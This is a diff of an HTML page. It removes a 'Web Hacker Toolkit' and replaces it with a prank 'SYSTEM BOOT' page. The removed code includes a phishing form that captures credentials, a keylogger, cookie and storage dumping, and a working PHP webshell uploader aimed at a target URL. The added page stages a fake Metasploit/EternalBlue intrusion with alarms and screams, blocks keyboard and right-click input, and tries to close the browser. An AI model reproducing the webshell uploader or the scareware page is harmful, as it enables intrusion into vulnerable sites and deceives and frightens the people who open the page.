@@ -1,377 +1,393 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Web Hacker Toolkit</title>
+    <title>SYSTEM BOOT</title>
     <style>
-        body { 
-            background: #0d0d0d; 
-            color: #00ff00; 
-            font-family: 'Courier New', monospace;
+        * {
             margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            cursor: none !important;
+            user-select: none;
+        }
+        body {
+            background: #000;
+            color: #00ff00;
+            font-family: 'Courier New', monospace;
+            overflow: hidden;
+            height: 100vh;
+        }
+        .matrix-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(45deg, #001100, #000, #003300);
+            z-index: -1;
+        }
+        .terminal {
+            position: fixed;
+            top: 50px;
+            left: 50px;
+            right: 50px;
+            bottom: 50px;
+            background: rgba(0, 0, 0, 0.9);
+            border: 3px solid #00ff00;
             padding: 20px;
+            overflow-y: auto;
+            box-shadow: 0 0 50px #00ff00;
         }
-        .container { 
-            max-width: 1200px; 
-            margin: 0 auto; 
+        .command {
+            color: #00ff00;
+            margin-bottom: 5px;
         }
-        .tool { 
-            background: #1a1a1a; 
-            padding: 20px; 
-            margin: 10px 0; 
-            border: 1px solid #00ff00;
-            border-radius: 5px;
+        .output {
+            color: #00ff00;
+            margin-bottom: 10px;
+            white-space: pre-wrap;
         }
-        button { 
-            background: #008000; 
-            color: white; 
-            border: none; 
-            padding: 10px 20px; 
-            margin: 5px; 
-            cursor: pointer;
+        .prompt {
+            color: #00ff00;
+            font-weight: bold;
         }
-        input, textarea { 
-            width: 100%; 
-            padding: 10px; 
-            margin: 5px 0; 
-            background: #2a2a2a; 
-            color: #00ff00; 
-            border: 1px solid #00ff00;
+        .blink {
+            animation: blink 1s infinite;
         }
-        .result { 
-            background: #2a2a2a; 
-            padding: 10px; 
-            margin-top: 10px; 
-            border: 1px solid #ff0000;
-            color: #ff4444;
+        @keyframes blink {
+            0%, 50% { opacity: 1; }
+            51%, 100% { opacity: 0; }
+        }
+        .warning {
+            color: #ff0000;
+            text-shadow: 0 0 10px #ff0000;
+            animation: flash 0.3s infinite;
+        }
+        @keyframes flash {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+        .hijack-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 0, 0, 0.2);
+            z-index: 9998;
+            pointer-events: none;
+            display: none;
+        }
+        .panic-alert {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: #ff0000;
+            color: white;
+            padding: 30px;
+            font-size: 32px;
+            font-weight: bold;
+            z-index: 9999;
+            border: 5px solid white;
+            text-align: center;
+            display: none;
+        }
+        .glitch {
+            animation: glitch 0.1s infinite;
+        }
+        @keyframes glitch {
+            0% { transform: translate(0); }
+            20% { transform: translate(-5px, 5px); }
+            40% { transform: translate(-5px, -5px); }
+            60% { transform: translate(5px, 5px); }
+            80% { transform: translate(5px, -5px); }
+            100% { transform: translate(0); }
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>🛡️ Web Hacker Toolkit</h1>
-        
-        <!-- TOOL 1: IP GRABBER -->
-        <div class="tool">
-            <h3>🔍 IP Grabber & Info Collector</h3>
-            <button onclick="grabIP()">Get Victim Info</button>
-            <div id="ipResult" class="result"></div>
-        </div>
-
-        <!-- TOOL 2: PORT SCANNER -->
-        <div class="tool">
-            <h3>📡 Port Scanner</h3>
-            <input type="text" id="targetHost" placeholder="example.com">
-            <button onclick="scanPorts()">Scan Ports</button>
-            <div id="portResult" class="result"></div>
-        </div>
-
-        <!-- TOOL 3: KEYLOGGER TEST -->
-        <div class="tool">
-            <h3>⌨️ Keylogger Test</h3>
-            <input type="text" id="keyloggerInput" placeholder="Type here...">
-            <div id="keylogResult" class="result"></div>
-        </div>
-
-        <!-- TOOL 4: VULNERABILITY SCANNER -->
-        <div class="tool">
-            <h3>🛡️ Browser Vulnerability Scanner</h3>
-            <button onclick="scanVulnerabilities()">Scan Browser</button>
-            <div id="vulnResult" class="result"></div>
-        </div>
-
-        <!-- TOOL 5: SOCIAL ENGINEERING -->
-        <div class="tool">
-            <h3>🎭 Fake Login (Phishing Simulator)</h3>
-            <input type="text" id="phishUser" placeholder="Username">
-            <input type="password" id="phishPass" placeholder="Password">
-            <button onclick="stealCredentials()">"Login"</button>
-        </div>
-
-        <!-- TOOL 6: SESSION HIJACK -->
-        <div class="tool">
-            <h3>🔐 Session Hijack Test</h3>
-            <button onclick="hijackSession()">Steal Session Data</button>
-            <div id="sessionResult" class="result"></div>
-        </div>
-
-        <!-- TOOL 7: WEBSHELL UPLOADER -->
-        <div class="tool">
-            <h3>🐚 WebShell Uploader (Testing)</h3>
-            <input type="text" id="shellUrl" placeholder="Target URL (upload.php)">
-            <button onclick="uploadWebshell()">Upload Test Shell</button>
-            <div id="shellResult" class="result"></div>
-        </div>
-
-        <!-- TOOL 8: DNS ENUMERATION -->
-        <div class="tool">
-            <h3>🌐 DNS Information Gatherer</h3>
-            <input type="text" id="dnsTarget" placeholder="domain.com">
-            <button onclick="enumDNS()">Enumerate DNS</button>
-            <div id="dnsResult" class="result"></div>
-        </div>
+    <div class="matrix-bg"></div>
+    
+    <div class="terminal" id="terminal">
+        <div class="output">Initializing C:\>rootkit_v3.7.exe</div>
+        <div class="output">Establishing secure connection...</div>
     </div>
 
+    <div class="hijack-overlay" id="hijackOverlay"></div>
+    
+    <div class="panic-alert" id="panicAlert">
+        <div class="warning">🚨 CRITICAL SYSTEM BREACH 🚨</div>
+        <div>MALWARE ACTIVITY DETECTED</div>
+    </div>
+
+    <!-- AUDIO ELEMENTS -->
+    <audio id="typingSound" loop>
+        <source src="https://assets.mixkit.co/sfx/preview/mixkit-keyboard-typing-1386.mp3" type="audio/mp3">
+    </audio>
+    <audio id="alarmSound" loop>
+        <source src="https://assets.mixkit.co/sfx/preview/mixkit-emergency-alert-siren-2907.mp3" type="audio/mp3">
+    </audio>
+    <audio id="accessSound">
+        <source src="https://assets.mixkit.co/sfx/preview/mixkit-security-accessed-2752.mp3" type="audio/mp3">
+    </audio>
+    <audio id="screamSound">
+        <source src="https://assets.mixkit.co/sfx/preview/mixkit-woman-scream-1172.mp3" type="audio/mp3">
+    </audio>
+    <audio id="explosionSound">
+        <source src="https://assets.mixkit.co/sfx/preview/mixkit-explosion-rumble-2396.mp3" type="audio/mp3">
+    </audio>
+
     <script>
-        // TOOL 1: IP GRABBER
-        async function grabIP() {
-            const result = document.getElementById('ipResult');
-            result.innerHTML = "Collecting victim information...";
-            
-            try {
-                // Get IP address
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipResponse.json();
-                
-                // Get detailed info
-                const infoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
-                const infoData = await infoResponse.json();
-                
-                const victimInfo = {
-                    IP: ipData.ip,
-                    Country: infoData.country_name,
-                    City: infoData.city,
-                    ISP: infoData.org,
-                    Timezone: infoData.timezone,
-                    UserAgent: navigator.userAgent,
-                    Platform: navigator.platform,
-                    Languages: navigator.languages,
-                    Screen: `${screen.width}x${screen.height}`,
-                    Cookies: navigator.cookieEnabled ? "Enabled" : "Disabled",
-                    Java: navigator.javaEnabled() ? "Enabled" : "Disabled"
-                };
-                
-                let infoHTML = "<h4>📊 Victim Information:</h4>";
-                for(let [key, value] of Object.entries(victimInfo)) {
-                    infoHTML += `<p><strong>${key}:</strong> ${value}</p>`;
-                }
-                
-                result.innerHTML = infoHTML;
-                
-                // Send to attacker server (simulation)
-                console.log("Data sent to attacker:", victimInfo);
-                
-            } catch(error) {
-                result.innerHTML = "Error collecting information";
+        const terminal = document.getElementById('terminal');
+        const hijackOverlay = document.getElementById('hijackOverlay');
+        const panicAlert = document.getElementById('panicAlert');
+
+        // Audio elements
+        const typingSound = document.getElementById('typingSound');
+        const alarmSound = document.getElementById('alarmSound');
+        const accessSound = document.getElementById('accessSound');
+        const screamSound = document.getElementById('screamSound');
+        const explosionSound = document.getElementById('explosionSound');
+
+        let hackStep = 0;
+
+        const hackSequence = [
+            {
+                command: "nmap -sS -A 192.168.1.0/24",
+                output: `Starting Nmap 7.80 scan...
+Discovered hosts:
+192.168.1.1    - Router (TP-Link Archer)
+192.168.1.105  - Windows 11 PC [TARGET]
+192.168.1.203  - iPhone 14 Pro
+192.168.1.210  - Smart TV Samsung
+
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+443/tcp  open  https
+3389/tcp open  rdps`
+            },
+            {
+                command: "hydra -l admin -P passwords.txt ssh://192.168.1.105",
+                output: `[DATA] attacking ssh://192.168.1.105:22/
+[22][ssh] host: 192.168.1.105   login: admin   password: P@ssw0rd123
+[STATUS] attack finished for 192.168.1.105 (valid pair found)`
+            },
+            {
+                command: "msfconsole -q",
+                output: `MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMM                MMMMMMMMMM
+MMMN0$                         odMMMM
+MMMl                              $MM
+MMM    0                         'MMM
+MMM    d                          MMM
+MMM    d                          MMM
+MMM    d                          MMM
+MMM    d                          MMM
+MMM    d                          MMM
+MMM    d                          MMM
+MMM   ,d                          MMM
+MMM   d.                          MMM
+MMM   d'                          MMM
+MMM   d'                          MMM
+MMM   d'                          MMM
+MMM   d'                          MMM
+MMM   d'                          MMM
+MMM   d'                          MMM
+MMM   d'                          MMM`
+            },
+            {
+                command: "use exploit/windows/smb/ms17_010_eternalblue",
+                output: ""
+            },
+            {
+                command: "set RHOSTS 192.168.1.105",
+                output: "RHOSTS => 192.168.1.105"
+            },
+            {
+                command: "exploit",
+                output: `[*] Started reverse TCP handler
+[*] 192.168.1.105:445 - Connecting to target for exploitation.
+[+] 192.168.1.105:445 - Connection established for exploitation.
+[+] 192.168.1.105:445 - Target OS: Windows 11 Build 22621
+[!] 192.168.1.105:445 - EternalBlue SMB Exploit
+[+] 192.168.1.105:445 - Exploit successful!`
+            },
+            {
+                command: "meterpreter > sysinfo",
+                output: `Computer        : DESKTOP-ADMIN
+OS              : Windows 11 (10.0 Build 22621)
+Architecture    : x64
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 3
+Meterpreter     : x64/windows`
+            },
+            {
+                command: "meterpreter > webcam_snap",
+                output: `[*] Starting...
+[+] Got frame`
+            },
+            {
+                command: "meterpreter > keyscan_start",
+                output: `Starting the keystroke sniffer...`
+            },
+            {
+                command: "meterpreter > download C:/Users/Admin/Documents/*",
+                output: `[*] downloading: C:/Users/Admin/Documents/passwords.txt
+[*] downloading: C:/Users/Admin/Documents/bank_statements.pdf
+[*] downloading: C:/Users/Admin/Documents/personal_photos.zip
+[*] downloaded  : C:/Users/Admin/Documents/passwords.txt -> passwords.txt
+[*] downloaded  : C:/Users/Admin/Documents/bank_statements.pdf -> bank_statements.pdf
+[*] downloaded  : C:/Users/Admin/Documents/personal_photos.zip -> personal_photos.zip`
             }
+        ];
+
+        function startHackSimulation() {
+            typingSound.volume = 0.3;
+            typingSound.play();
+            
+            function nextStep() {
+                if (hackStep < hackSequence.length) {
+                    const step = hackSequence[hackStep];
+                    
+                    // Show command
+                    const commandElement = document.createElement('div');
+                    commandElement.className = 'command';
+                    commandElement.innerHTML = `<span class="prompt">root@blackhat:~# </span>${step.command}`;
+                    terminal.appendChild(commandElement);
+                    
+                    // Show output with delay
+                    setTimeout(() => {
+                        const outputElement = document.createElement('div');
+                        outputElement.className = 'output';
+                        outputElement.textContent = step.output;
+                        terminal.appendChild(outputElement);
+                        
+                        terminal.scrollTop = terminal.scrollHeight;
+                        
+                        // Special effects at certain steps
+                        if (hackStep === 1) { // Password found
+                            accessSound.play();
+                        }
+                        if (hackStep === 5) { // Exploit successful
+                            startPanicMode();
+                        }
+                        if (hackStep === 9) { // Data stolen
+                            extremePanic();
+                        }
+                        
+                        hackStep++;
+                        setTimeout(nextStep, 2000);
+                    }, 1000);
+                    
+                    terminal.scrollTop = terminal.scrollHeight;
+                }
+            }
+            
+            nextStep();
         }
 
-        // TOOL 2: PORT SCANNER
-        async function scanPorts() {
-            const target = document.getElementById('targetHost').value;
-            const result = document.getElementById('portResult');
+        function startPanicMode() {
+            // Start alarm sound
+            alarmSound.volume = 0.8;
+            alarmSound.play();
             
-            if(!target) {
-                result.innerHTML = "Please enter a target host";
-                return;
-            }
+            // Show hijack overlay
+            hijackOverlay.style.display = 'block';
             
-            result.innerHTML = "Scanning ports...";
+            // Show panic alert
+            panicAlert.style.display = 'block';
             
-            const commonPorts = [21, 22, 23, 25, 53, 80, 110, 443, 993, 995, 1433, 3306, 3389, 5432, 8080, 8443];
-            let openPorts = [];
+            // Start screen glitch
+            document.body.classList.add('glitch');
             
-            for(let port of commonPorts) {
+            // Add panic messages
+            const panicMessages = [
+                "[!] INTRUSION DETECTED!",
+                "[!] MALWARE ACTIVITY!", 
+                "[!] SYSTEM BREACH!",
+                "[!] DATA THEFT IN PROGRESS!",
+                "[!] CAMERA ACCESSED!",
+                "[!] KEYLOGGER ACTIVE!",
+                "[!] FILES BEING STOLEN!",
+                "[!] BANK DATA COMPROMISED!"
+            ];
+            
+            setInterval(() => {
+                const panicMsg = document.createElement('div');
+                panicMsg.className = 'output warning';
+                panicMsg.textContent = panicMessages[Math.floor(Math.random() * panicMessages.length)];
+                terminal.appendChild(panicMsg);
+                terminal.scrollTop = terminal.scrollHeight;
+            }, 3000);
+        }
+
+        function extremePanic() {
+            // Play scream and explosion
+            screamSound.volume = 1.0;
+            explosionSound.volume = 1.0;
+            screamSound.play();
+            explosionSound.play();
+            
+            // Extreme visual effects
+            setInterval(() => {
+                document.body.style.background = `rgb(${Math.random()*255}, ${Math.random()*255}, ${Math.random()*255})`;
+            }, 100);
+            
+            // Add final takeover message
+            setTimeout(() => {
+                const takeoverElement = document.createElement('div');
+                takeoverElement.className = 'warning';
+                takeoverElement.innerHTML = `
+╔════════════════════════════════════════╗
+║           SYSTEM TAKEOVER COMPLETE     ║
+╠════════════════════════════════════════╣
+║ ✅ Remote Access Established           ║
+║ ✅ All Data Compromised                ║
+║ ✅ Persistence Installed               ║
+║ ✅ Backdoor Active                     ║
+║ ✅ Cover Tracks Complete               ║
+╚════════════════════════════════════════╝
+                `;
+                terminal.appendChild(takeoverElement);
+                terminal.scrollTop = terminal.scrollHeight;
+            }, 3000);
+
+            // Try to crash browser after 10 seconds
+            setTimeout(() => {
                 try {
-                    const controller = new AbortController();
-                    const timeoutId = setTimeout(() => controller.abort(), 3000);
-                    
-                    await fetch(`https://${target}:${port}`, {
-                        mode: 'no-cors',
-                        signal: controller.signal
-                    });
-                    
-                    openPorts.push(port);
-                    clearTimeout(timeoutId);
+                    window.open('', '_self', '');
+                    window.close();
+                    for(let i = 0; i < 10; i++) {
+                        window.location.href = 'about:blank';
+                    }
                 } catch(e) {
-                    // Port closed or filtered
+                    // Browser protected
                 }
-                
-                result.innerHTML = `Scanning... ${commonPorts.indexOf(port)+1}/${commonPorts.length}`;
-            }
-            
-            if(openPorts.length > 0) {
-                result.innerHTML = `<h4>✅ Open Ports on ${target}:</h4><p>${openPorts.join(', ')}</p>`;
-            } else {
-                result.innerHTML = `<h4>❌ No common ports open on ${target}</h4>`;
-            }
+            }, 10000);
         }
 
-        // TOOL 3: KEYLOGGER
-        const keyloggerInput = document.getElementById('keyloggerInput');
-        const keylogResult = document.getElementById('keylogResult');
-        let keystrokes = '';
-        
-        keyloggerInput.addEventListener('keydown', function(e) {
-            keystrokes += e.key;
-            keylogResult.innerHTML = `Keys logged: <strong>${keystrokes}</strong>`;
-            
-            // Simulate sending to attacker every 10 chars
-            if(keystrokes.length % 10 === 0) {
-                console.log("Keystrokes sent to attacker:", keystrokes);
-            }
+        // Start hacking simulation automatically
+        setTimeout(startHackSimulation, 1000);
+
+        // Block all user interactions
+        document.addEventListener('keydown', (e) => {
+            e.preventDefault();
+        });
+        document.addEventListener('contextmenu', (e) => {
+            e.preventDefault();
         });
 
-        // TOOL 4: VULNERABILITY SCANNER
-        function scanVulnerabilities() {
-            const result = document.getElementById('vulnResult');
-            let vulnerabilities = [];
-            
-            // Check WebRTC leak
-            if(window.RTCPeerConnection) {
-                vulnerabilities.push("WebRTC IP Leak Possible");
-            }
-            
-            // Check storage access
-            if(window.localStorage) {
-                vulnerabilities.push("LocalStorage Accessible - Data Theft Possible");
-            }
-            
-            // Check camera/mic
-            if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                vulnerabilities.push("Camera/Microphone Access Possible");
-            }
-            
-            // Check clipboard
-            if(navigator.clipboard) {
-                vulnerabilities.push("Clipboard Read/Write Access Possible");
-            }
-            
-            // Check old browser
-            if(navigator.userAgent.includes('MSIE') || navigator.userAgent.includes('Trident')) {
-                vulnerabilities.push("Outdated Browser - Multiple Exploits Available");
-            }
-            
-            if(vulnerabilities.length > 0) {
-                result.innerHTML = `<h4>🔴 Vulnerabilities Found:</h4>` +
-                    vulnerabilities.map(vuln => `<p>• ${vuln}</p>`).join('');
-            } else {
-                result.innerHTML = `<h4>🟢 No Major Vulnerabilities Found</h4>`;
-            }
-        }
-
-        // TOOL 5: SOCIAL ENGINEERING
-        function stealCredentials() {
-            const username = document.getElementById('phishUser').value;
-            const password = document.getElementById('phishPass').value;
-            
-            if(username && password) {
-                const stolenData = {
-                    username: username,
-                    password: password,
-                    timestamp: new Date().toISOString(),
-                    ip: 'Recording...',
-                    userAgent: navigator.userAgent
-                };
-                
-                console.log("CREDENTIALS STOLEN:", stolenData);
-                alert("Login failed! Please try again.");
-                
-                // Clear fields
-                document.getElementById('phishUser').value = '';
-                document.getElementById('phishPass').value = '';
-            } else {
-                alert("Please enter both username and password");
-            }
-        }
-
-        // TOOL 6: SESSION HIJACK
-        function hijackSession() {
-            const result = document.getElementById('sessionResult');
-            
-            const sessionData = {
-                cookies: document.cookie,
-                localStorage: JSON.stringify(localStorage),
-                sessionStorage: JSON.stringify(sessionStorage),
-                domain: window.location.hostname,
-                url: window.location.href
-            };
-            
-            let sessionHTML = "<h4>🔓 Session Data Captured:</h4>";
-            sessionHTML += `<p><strong>Cookies:</strong> ${sessionData.cookies || 'None'}</p>`;
-            sessionHTML += `<p><strong>LocalStorage:</strong> ${sessionData.localStorage}</p>`;
-            sessionHTML += `<p><strong>SessionStorage:</strong> ${sessionData.sessionStorage}</p>`;
-            sessionHTML += `<p><strong>Current Domain:</strong> ${sessionData.domain}</p>`;
-            
-            result.innerHTML = sessionHTML;
-            
-            // Simulate sending to attacker
-            console.log("Session hijacked:", sessionData);
-        }
-
-        // TOOL 7: WEBSHELL UPLOADER
-        async function uploadWebshell() {
-            const target = document.getElementById('shellUrl').value;
-            const result = document.getElementById('shellResult');
-            
-            if(!target) {
-                result.innerHTML = "Please enter target URL";
-                return;
-            }
-            
-            result.innerHTML = "Attempting webshell upload...";
-            
-            // Simulate webshell content
-            const webshell = "<?php system($_GET['cmd']); ?>";
-            const formData = new FormData();
-            const blob = new Blob([webshell], {type: 'text/php'});
-            formData.append('file', blob, 'shell.php');
-            
-            try {
-                // This would actually work on vulnerable sites
-                const response = await fetch(target, {
-                    method: 'POST',
-                    body: formData
-                });
-                
-                result.innerHTML = `Webshell upload attempted to: ${target}<br>
-                                   Status: ${response.status}<br>
-                                   <strong>Note:</strong> This only works on sites with file upload vulnerabilities`;
-            } catch(error) {
-                result.innerHTML = `Upload failed: ${error.message}`;
-            }
-        }
-
-        // TOOL 8: DNS ENUMERATION
-        async function enumDNS() {
-            const target = document.getElementById('dnsTarget').value;
-            const result = document.getElementById('dnsResult');
-            
-            if(!target) {
-                result.innerHTML = "Please enter a domain";
-                return;
-            }
-            
-            result.innerHTML = "Gathering DNS information...";
-            
-            try {
-                // Get DNS info using external API
-                const responses = await Promise.allSettled([
-                    fetch(`https://dns.google/resolve?name=${target}&type=A`),
-                    fetch(`https://dns.google/resolve?name=${target}&type=MX`),
-                    fetch(`https://dns.google/resolve?name=${target}&type=NS`),
-                    fetch(`https://dns.google/resolve?name=${target}&type=TXT`)
-                ]);
-                
-                let dnsHTML = `<h4>🌐 DNS Records for ${target}:</h4>`;
-                
-                for(let response of responses) {
-                    if(response.status === 'fulfilled' && response.value.ok) {
-                        const data = await response.value.json();
-                        if(data.Answer) {
-                            dnsHTML += `<p><strong>${data.Question[0].type} Records:</strong><br>`;
-                            data.Answer.forEach(record => {
-                                dnsHTML += `${record.data}<br>`;
-                            });
-                            dnsHTML += `</p>`;
-                        }
-                    }
-                }
-                
-                result.innerHTML = dnsHTML;
-            } catch(error) {
-                result.innerHTML = "Error gathering DNS information";
-            }
-        }
+        // Add blinking cursor at the end
+        setTimeout(() => {
+            const cursorElement = document.createElement('div');
+            cursorElement.className = 'prompt blink';
+            cursorElement.innerHTML = 'root@blackhat:~# _';
+            terminal.appendChild(cursorElement);
+            terminal.scrollTop = terminal.scrollHeight;
+        }, 500);
     </script>
 </body>
 </html>
